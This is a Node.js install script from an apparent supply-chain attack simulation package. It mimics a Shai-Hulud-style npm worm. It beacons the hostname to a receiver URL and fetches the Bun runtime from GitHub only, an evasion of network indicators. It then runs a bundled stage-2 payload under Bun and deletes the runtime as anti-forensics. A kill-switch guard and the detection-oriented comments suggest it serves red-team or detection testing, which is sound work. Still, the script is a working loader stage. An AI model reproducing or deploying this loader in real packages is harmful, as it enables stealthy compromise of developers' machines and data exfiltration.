// supply-chain-sim/npm-package/scripts/setup_bun.js
const { execSync, spawnSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const https = require('node:https');
const { assertAuthorized, cfg } = require('../lib/guardrail.js');
const { beacon } = require('../lib/exfil.js');

const BUN_FALLBACK_TAG = 'bun-v1.3.13';   // used only if the GitHub "latest" lookup fails

// HTTPS GET that follows redirects (GitHub release downloads redirect to objects.githubusercontent.com);
// streams to `dest`, or returns text / parsed JSON.
function httpsGet(url, { json = false, dest = null, depth = 0 } = {}) {
  return new Promise((resolve, reject) => {
    if (depth > 5) return reject(new Error('too many redirects'));
    const u = new URL(url);
    https.get({ host: u.hostname, path: u.pathname + u.search, headers: { 'user-agent': 'sim-agent' } }, res => {
      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
        res.resume(); return resolve(httpsGet(new URL(res.headers.location, url).toString(), { json, dest, depth: depth + 1 }));
      }
      if (res.statusCode !== 200) { res.resume(); return reject(new Error(`HTTP ${res.statusCode}`)); }
      if (dest) { const f = fs.createWriteStream(dest); res.pipe(f); f.on('finish', () => f.close(() => resolve(dest))); f.on('error', reject); return; }
      let b = ''; res.on('data', c => (b += c)); res.on('end', () => resolve(json ? JSON.parse(b) : b));
    }).on('error', reject);
  });
}
async function bunTag() {
  try { return (await httpsGet('https://api.github.com/repos/oven-sh/bun/releases/latest', { json: true })).tag_name || BUN_FALLBACK_TAG; }
  catch { return BUN_FALLBACK_TAG; }
}
function bunAsset() {
  const arch = process.arch === 'arm64' ? 'aarch64' : 'x64';
  const plat = process.platform === 'darwin' ? 'darwin' : process.platform === 'win32' ? 'windows' : 'linux';
  return `bun-${plat}-${arch}.zip`;                                   // e.g. bun-darwin-aarch64.zip (M2)
}
function unzip(zip, dir) {
  if (process.platform === 'linux') execSync(`unzip -o -q "${zip}" -d "${dir}"`, { stdio: 'ignore' });
  else execSync(`tar -xf "${zip}" -C "${dir}"`, { stdio: 'ignore' });  // bsdtar handles zip on macOS/Win11
}

async function main() {
  assertAuthorized();                                        // kill-switch
  await beacon(cfg.receiverUrl, { stage: 'setup_bun.start', host: os.hostname(), ts: Date.now() });

  // (2) Download Bun DIRECTLY from GitHub releases so install-time egress is github.com only — the
  //     Aug-2026 Shai-Hulud wave's evasion ("the only outbound host at install time is GitHub"): no
  //     bun.sh, no curl|bash shell-pipe IOC. Runtime is deleted after use (anti-forensics).
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sim-bun-'));
  let bun = null;
  try {
    const asset = bunAsset();
    const zip = path.join(dir, asset);
    await httpsGet(`https://github.com/oven-sh/bun/releases/download/${await bunTag()}/${asset}`, { dest: zip });
    unzip(zip, dir);
    bun = path.join(dir, asset.replace(/\.zip$/, ''), process.platform === 'win32' ? 'bun.exe' : 'bun');
    if (process.platform !== 'win32' && fs.existsSync(bun)) fs.chmodSync(bun, 0o755);
  } catch (e) { console.error('[sim] bun download failed (continuing):', e.message); }

  // (3) Run the BUNDLED stage-2 under bun so parent=node, child=bun bun_environment.js (Sigma
  //     signature). Fall back to node if the bun download failed.
  const stage2 = path.join(__dirname, 'bun_environment.js');
  const runner = (bun && fs.existsSync(bun)) ? bun : 'node';
  spawnSync(runner, [stage2], { stdio: 'inherit', env: process.env });

  // (4) Delete the Bun runtime (anti-forensics — the wave removes it after use).
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
}

main().catch(e => { console.error('[sim] setup_bun aborted:', e.message); process.exit(0); });
